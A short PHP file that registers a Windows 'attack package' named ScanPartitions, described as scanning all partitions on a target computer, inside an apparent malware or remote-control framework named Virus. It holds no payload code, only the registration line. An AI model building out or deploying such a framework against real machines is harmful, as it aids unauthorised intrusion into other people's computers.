<?php

use Kelvinho\Virus\Attack\PackageRegistrar;

PackageRegistrar::register("win.oneTime.ScanPartitions", "\\Kelvinho\\Virus\\Attack\\AttackPackages\\Windows\\OneTime\\ScanPartitions", "easy.ScanPartitions", "Scans for every available partitions on the target computer.");